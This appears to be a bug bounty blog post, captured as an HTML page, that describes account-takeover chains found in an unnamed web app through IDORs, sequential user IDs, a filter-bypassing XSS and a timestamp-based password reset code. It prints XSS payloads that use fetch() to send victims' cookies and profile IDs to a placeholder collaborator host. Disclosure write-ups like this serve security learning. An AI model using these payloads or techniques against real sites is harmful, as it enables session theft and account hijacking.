@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-mode">
+<head>
+
+    <title>Taking over accounts in multiple ways</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+        :root {
+            --button-bg-color: #ffffff;
+            --button-text-color: var(--color-darkgrey);
+        }
+    </style>
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=d7abf9a1a1" />
+
+    <link rel="canonical" href="https://vict0ni.me/taking-over-accounts-in-multiple-ways/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:site_name" content="vict0ni.me" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Taking over accounts in multiple ways" />
+    <meta property="og:description" content="With my invitation to renniepak&#x27;s HackerHideout, I got the chance to re-live the bug bounty/hunting thrill that I hadn&#x27;t felt for some time. I haven&#x27;t bug hunted for quite a while, so I decided to write a small post about two recent findings that could lead to an account" />
+    <meta property="og:url" content="https://vict0ni.me/taking-over-accounts-in-multiple-ways/" />
+    <meta property="og:image" content="https://vict0ni.me/content/images/2024/04/szu2iuwjitl91.jpg" />
+    <meta property="article:published_time" content="2024-04-17T16:00:52.000Z" />
+    <meta property="article:modified_time" content="2024-04-19T08:53:06.000Z" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Taking over accounts in multiple ways" />
+    <meta name="twitter:description" content="With my invitation to renniepak&#x27;s HackerHideout, I got the chance to re-live the bug bounty/hunting thrill that I hadn&#x27;t felt for some time. I haven&#x27;t bug hunted for quite a while, so I decided to write a small post about two recent findings that could lead to an account" />
+    <meta name="twitter:url" content="https://vict0ni.me/taking-over-accounts-in-multiple-ways/" />
+    <meta name="twitter:image" content="https://vict0ni.me/content/images/2024/04/szu2iuwjitl91.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="vict0ni" />
+    <meta name="twitter:site" content="@vict0ni" />
+    <meta property="og:image:width" content="2048" />
+    <meta property="og:image:height" content="1152" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "vict0ni.me",
+        "url": "https://vict0ni.me/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://vict0ni.me/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "vict0ni",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://vict0ni.me/content/images/2024/03/TGP2824GM-U01Q71426E6-c4f772d4f03a-512.jpeg",
+            "width": 512,
+            "height": 512
+        },
+        "url": "https://vict0ni.me/author/vict0ni/",
+        "sameAs": []
+    },
+    "headline": "Taking over accounts in multiple ways",
+    "url": "https://vict0ni.me/taking-over-accounts-in-multiple-ways/",
+    "datePublished": "2024-04-17T16:00:52.000Z",
+    "dateModified": "2024-04-19T08:53:06.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://vict0ni.me/content/images/2024/04/szu2iuwjitl91.jpg",
+        "width": 2048,
+        "height": 1152
+    },
+    "description": "With my invitation to renniepak [https://twitter.com/renniepak]&#x27;s HackerHideout\n[https://hackerhideout.xyz/], I got the chance to re-live the bug bounty/hunting\nthrill that I hadn&#x27;t felt for some time. I haven&#x27;t bug hunted for quite a while,\nso I decided to write a small post about two recent findings that could lead to\nan account takeover (ATO) and one bonus informative finding that I was so close\nto escalating to a high, but yet so far.\n\nDisclaimer: the bugs were reported in a VDP, so fewer (a",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://vict0ni.me/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.33" />
+    <link rel="alternate" type="application/rss+xml" title="vict0ni.me" href="https://vict0ni.me/rss/" />
+    
+    <script defer src="/public/cards.min.js?v=d7abf9a1a1"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=d7abf9a1a1">
+    <script>document.documentElement.classList.add('dark-mode');</script>
+<style>
+    a.gh-head-button {
+        display: none;
+    }
+</style><style>:root {--ghost-accent-color: #262626;}</style>
+
+</head>
+<body class="post-template">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head">
+        <nav class="gh-head-inner inner gh-container">
+
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="https://vict0ni.me">
+                        vict0ni.me
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="https://vict0ni.me/">Home</a></li>
+    <li class="nav-about"><a href="https://vict0ni.me/about/">About</a></li>
+    <li class="nav-work-and-research"><a href="https://vict0ni.me/work/">Work and Research</a></li>
+</ul>
+
+            </div>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                        <a class="gh-social-twitter" href="https://twitter.com/vict0ni" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+                </div>
+
+                    <a class="gh-head-button" href="#/portal/signup" data-portal="signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+    <article class="article post image-small">
+
+        <header class="article-header gh-canvas">
+
+
+            <h1 class="article-title">Taking over accounts in multiple ways</h1>
+
+
+            <div class="article-byline">
+                <section class="article-byline-content">
+                    <ul class="author-list">
+                        <li class="author-list-item">
+                            <a href="/author/vict0ni/" class="author-avatar">
+                                <img class="author-profile-image" src="/content/images/size/w100/2024/03/TGP2824GM-U01Q71426E6-c4f772d4f03a-512.jpeg" alt="vict0ni" />
+                            </a>
+                        </li>
+                    </ul>
+                    <div class="article-byline-meta">
+                        <h4 class="author-name"><a href="/author/vict0ni/">vict0ni</a></h4>
+                        <div class="byline-meta-content">
+                            <time class="byline-meta-date" datetime="2024-04-17">Apr 17, 2024</time>
+                            <span class="byline-reading-time"><span class="bull">&bull;</span> 6 min read</span>
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <figure class="article-image">
+                <img
+                    srcset="/content/images/size/w300/2024/04/szu2iuwjitl91.jpg 300w,
+                            /content/images/size/w600/2024/04/szu2iuwjitl91.jpg 600w,
+                            /content/images/size/w1000/2024/04/szu2iuwjitl91.jpg 1000w,
+                            /content/images/size/w2000/2024/04/szu2iuwjitl91.jpg 2000w"
+                    sizes="(min-width: 1400px) 1400px, 92vw"
+                    src="/content/images/size/w2000/2024/04/szu2iuwjitl91.jpg"
+                    alt="Taking over accounts in multiple ways"
+                />
+            </figure>
+        </header>
+
+        <section class="gh-content gh-canvas">
+            <p>With my invitation to <a href="https://twitter.com/renniepak">renniepak</a>'s <a href="https://hackerhideout.xyz/">HackerHideout</a>, I got the chance to re-live the bug bounty/hunting thrill that I hadn't felt for some time. I haven't bug hunted for quite a while, so I decided to write a small post about two recent findings that could lead to an account takeover (ATO) and one bonus informative finding that I was so close to escalating to a high, but yet so far.</p><p>Disclaimer: the bugs were reported in a VDP, so fewer (and only) swag points for me, I guess.</p><h3 id="the-web-application">The web application</h3><p>In this application, organization owners submit information about their company such as legal documents, financial details, and other information for the application owner to review and accept (or decline). An organization owner creates an account with a username and an email address, and then they can further explore the app, and submit the above-mentioned details and documents.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://vict0ni.me/content/images/2024/04/app-2.png" class="kg-image" alt loading="lazy" width="1331" height="1031" srcset="https://vict0ni.me/content/images/size/w600/2024/04/app-2.png 600w, https://vict0ni.me/content/images/size/w1000/2024/04/app-2.png 1000w, https://vict0ni.me/content/images/2024/04/app-2.png 1331w" sizes="(min-width: 720px) 720px"><figcaption>Graphical representation of the web application</figcaption></figure><h2 id="ato-1-unauthorized-change-of-email-address">ATO #1: Unauthorized change of email address</h2><p>The first way to takeover an account in this application is through a simple IDOR. A user can change their email address without password verification. When submitting an email change, one can see their account's ID being sent along with the email address. Changing this ID to another user's ID will change that other user's email address. The only problem? No one knows another user's ID.</p><p>Here comes into play the disregard of security best practices. According to security best practices, user IDs should not be sequential. Rather, they should be randomly generated, UUIDv4 ideally. In our case, the application generates IDs sequentially. This, along with the fact that the email address modification endpoint is susceptible to brute forcing attacks, allows an attacker to change the email address of ALL of the accounts in the application (~1700 accounts). The attacker needs to only fuzz IDs up until their ID. Since the victim's account exists already it has a lower ID.</p><p>After changing the email address of the victim to one an attacker owns, they can request a password reset using the victim's username and the new email address.</p><figure class="kg-card kg-image-card"><img src="https://i.gifer.com/73uf.gif" class="kg-image" alt loading="lazy"></figure><p>Is it elegant? No. Is it quiet and under the hood? No. Is it successful? Yes.</p><h2 id="ato-2-idor-to-xss-to-email-address-change">ATO #2: IDOR to XSS to Email Address Change</h2><p>This vulnerability is a bug chain that can lead to an account takeover. The bug chain takes advantage of two vulnerabilities that can lead to unauthorized access to the victim's account.</p><h3 id="bug-1-self-xss-in-an-uploaded-document">Bug #1: Self-XSS in an uploaded document</h3><p>As mentioned, a user can upload any document. This document can either be assigned to one of the user's organizations or just be an uploaded document waiting to be assigned to an organization.</p><p>The documents are allowed to have HTML content that gets rendered. Although the application is filtering obvious payloads such as <code>&lt;script&gt;</code> tags and elements such as <code>onerror</code> etc. it was failing to catch slightly obfuscated payloads such as <code>&lt;img src="x"/onerror="alert(1)"&gt;</code>. With this, we have achieved a (self-)XSS.</p><p>But how can we deliver this to another user?</p><h3 id="bug-2-idor-in-document-upload">Bug #2: IDOR in document upload</h3><p>Since there was already an IDOR existing (ATO #1), this is an indication that there might be other authorization issues around the application. It turns out that an attacker can upload an unassigned document to another user's account by modifying the user ID. Then the document is assigned a document ID, which an attacker can view in the request's response.</p><p>The only hindrance in this is that an attacker cannot know the user ID of the victim. This severely lowers the severity of the vulnerability, since the attack complexity is set to high. If an attacker knows the victim's user ID, they can then deliver the document URL to the victim, triggering the XSS, once the victim clicks the URL.</p><pre><code>https://sub.target.tld/index.php?module=Documents&amp;view=Detail&amp;record=&lt;DOCUMENT ID&gt;&amp;app=MARKETING</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://vict0ni.me/content/images/2024/04/ato-xss.png" class="kg-image" alt loading="lazy" width="462" height="302"><figcaption>Sequence diagram of the targeted bug flow</figcaption></figure><p>But one can also follow the same path as in ATO #1: upload to all the accounts in the application a document with a XSS payload, hoping that someone will fall for it and open it.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://vict0ni.me/content/images/2024/04/idor.png" class="kg-image" alt loading="lazy" width="1258" height="754" srcset="https://vict0ni.me/content/images/size/w600/2024/04/idor.png 600w, https://vict0ni.me/content/images/size/w1000/2024/04/idor.png 1000w, https://vict0ni.me/content/images/2024/04/idor.png 1258w" sizes="(min-width: 720px) 720px"><figcaption>assigned_user_id = user ID, _recordId = document ID</figcaption></figure><p>Until now, we have achieved to execute JavaScript code in our victim's/victims' browser. Can we escalate this to get unauthorized access?</p><h3 id="xss-isnt-this-just-a-fancy-word-for-account-takeover">XSS? Isn't this just a fancy word for "account takeover"?</h3><p>A XSS on its own cannot cause an account takeover. Typically, for an ATO to be achieved, the site must use a cookie-based authentication mechanism and cookies must be missing the HTTPOnly flag. That way, a XSS payload can access and transfer the cookies to the attacker.</p><p>In this case, the application needed two things for a XSS to have an ATO impact: the cookies and the user ID. Using both, an attacker can access the victim's profile, change the email address, and takeover the account by resetting the password.</p><p>This is achieved by using the following XSS payloads:</p><pre><code class="language-html">&lt;img src="x"/onerror="fetch('https://BURP-COLLABORATOR', {method: 'POST',mode: 'no-cors',body:document.cookie});"&gt;
+
+&lt;img src="x"/onerror="var linkElement = document.getElementById('[VALUE]');fetch('https://BURP-COLLABORATOR', {method: 'POST',mode: 'no-cors',body:linkElement});"&gt;</code></pre><p>where <code>[VALUE]</code> is the <code>href</code> attribute of an <code>&lt;a&gt;</code> HTML tag that contains the link to the account preferences, which includes the user's ID.</p><p>The first payload sends the attacker the victim's cookies and the second payload sends the link to the account preferences of the victim, which contains the user's ID. Combining those two, an attacker can access the victim's profile, edit it, change the email address <strong>without password verification</strong>, request a password reset, and takeover the account.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://vict0ni.me/content/images/2024/04/xss-ato-1.png" class="kg-image" alt loading="lazy" width="1629" height="577" srcset="https://vict0ni.me/content/images/size/w600/2024/04/xss-ato-1.png 600w, https://vict0ni.me/content/images/size/w1000/2024/04/xss-ato-1.png 1000w, https://vict0ni.me/content/images/size/w1600/2024/04/xss-ato-1.png 1600w, https://vict0ni.me/content/images/2024/04/xss-ato-1.png 1629w" sizes="(min-width: 720px) 720px"><figcaption>record = user ID</figcaption></figure><p>Unfortunately (for me) the XSS issue was a duplicate but the IDOR issue was a valid submission. Thus, the report was lowered from high to medium severity. Still, a very nice bug chain that I really enjoyed!</p><h2 id="bonus-finding-almost-sandwich-attack-on-password-reset-code">Bonus finding: (Almost) Sandwich attack on password reset code</h2><p>I was so close to a sandwich attack on a reset password functionality that could let to an ATO but the backend server took its time.</p><p>Password reset codes were generated based on a hex representation of the UNIX timestamp (with milliseconds). Requests were sent at the same time but the backend server was too slow between the code generations and the timestamp range was too large to be realistic.</p><p>A sandwich attack on this function would work like this: send three reset password requests. The first one for your account, the second one for your victim's, and the third one again for your account.</p><figure class="kg-card kg-image-card"><img src="https://vict0ni.me/content/images/2024/04/sw-attack.png" class="kg-image" alt loading="lazy" width="541" height="352"></figure><p>Since the reset code is timestamp-based, the victim's code's value must be between the two codes of your account. If those requests are sent really fast, the range between the two codes must be really small, thus the fuzzing for the victim's code would be realistic.</p><p>The problem is that the backend system that generates the codes must also be properly configured to generate them in proper timing and not "take its time". The latter was the case here. The system was taking its time, making the timestamp range really big, even if the requests were sent with almost no delay between them.</p><p>I successfully exploited this only once, probably by luck. The triager wasn't satisfied though. The result? Secured by unstable code!</p><p>This particular "Sandwich Attack" is/would be a combination of those two excellent writeups: </p><ol><li><a href="https://twitter.com/0xLupin">Lupin</a>'s <a href="https://landh.tech/blog/20230811-sandwich-attack">Sandwich Attack ATO on UUIDv1</a></li><li><a href="https://twitter.com/Fatnass1F1ras">F1ras</a>'s <a href="https://infosecwriteups.com/how-i-was-able">password reset ATO</a></li></ol>
+        </section>
+
+
+    </article>
+</main>
+
+
+
+<aside class="read-more-wrap">
+    <div class="read-more inner">
+
+
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="/elastic-search2/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2024/03/es2.png 300w,
+                    /content/images/size/w600/2024/03/es2.png 600w,
+                    /content/images/size/w1000/2024/03/es2.png 1000w,
+                    /content/images/size/w2000/2024/03/es2.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="/content/images/size/w600/2024/03/es2.png"
+            alt="On the hunt for data leaks: Elastic(search²)"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/elastic-search2/">
+            <header class="post-card-header">
+                <h2 class="post-card-title">On the hunt for data leaks: Elastic(search²)</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>[BSides Athens 2024 tool presentation slides.]                                                             Stretching the Boundaries Hunting for Elasticsearch Leaks1                                                                   Stretching the Boundaries_ Hunting for Elasticsearch Leaks(1).pptx                         1 MB                                                                            .a{fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round;stroke-width:1.5px;}download-circle                                                Since October 2023, I've discovered more than 10M PII of people and helped</p>
+            </div>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="/author/vict0ni/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2024/03/TGP2824GM-U01Q71426E6-c4f772d4f03a-512.jpeg" alt="vict0ni" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/vict0ni/">vict0ni</a></span>
+                <span class="post-card-byline-date"><time datetime="2024-03-30">Mar 30, 2024</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="/sensitive-documents-of-75-million-indian-residents-exposed-through-bug/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2024/02/indian.png 300w,
+                    /content/images/size/w600/2024/02/indian.png 600w,
+                    /content/images/size/w1000/2024/02/indian.png 1000w,
+                    /content/images/size/w2000/2024/02/indian.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="/content/images/size/w600/2024/02/indian.png"
+            alt="Sensitive documents of 75 million Indian residents exposed [by Jagmeet Singh @ TechCrunch]"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/sensitive-documents-of-75-million-indian-residents-exposed-through-bug/">
+            <header class="post-card-header">
+                <h2 class="post-card-title">Sensitive documents of 75 million Indian residents exposed [by Jagmeet Singh @ TechCrunch]</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Article written by Jagmeet Singh for TechCrunch after my finding report about a bug in Rajasthan's portal that allowed access to Janaadhaar's applicants' documents.</p>
+            </div>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="/author/vict0ni/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2024/03/TGP2824GM-U01Q71426E6-c4f772d4f03a-512.jpeg" alt="vict0ni" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/vict0ni/">vict0ni</a></span>
+                <span class="post-card-byline-date"><time datetime="2024-02-19">Feb 19, 2024</time> <span class="bull">&bull;</span> 1 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="/discovering-intelligence-agency-leaks/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2024/04/image1048.png 300w,
+                    /content/images/size/w600/2024/04/image1048.png 600w,
+                    /content/images/size/w1000/2024/04/image1048.png 1000w,
+                    /content/images/size/w2000/2024/04/image1048.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="/content/images/size/w600/2024/04/image1048.png"
+            alt="Discovering Intelligence Agency Leaks [by Matt Burgess @ WIRED]"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/discovering-intelligence-agency-leaks/">
+            <header class="post-card-header">
+                <h2 class="post-card-title">Discovering Intelligence Agency Leaks [by Matt Burgess @ WIRED]</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Article written by Matt Burgess for WIRED after my finding about the leaks of a Bangladeshi SIGINT agency.</p>
+            </div>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="/author/vict0ni/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2024/03/TGP2824GM-U01Q71426E6-c4f772d4f03a-512.jpeg" alt="vict0ni" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/vict0ni/">vict0ni</a></span>
+                <span class="post-card-byline-date"><time datetime="2023-11-16">Nov 16, 2023</time> <span class="bull">&bull;</span> 1 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+    </div>
+</aside>
+
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="https://vict0ni.me">vict0ni.me</a> &copy; 2025</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="/assets/built/casper.js?v=d7abf9a1a1"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+<style>
+    a.gh-head-button {
+        display: none;
+    }
+</style>
+<a rel="me" href="https://infosec.exchange/@vict0ni">Mastodon</a>
+
+</body>
+</html>
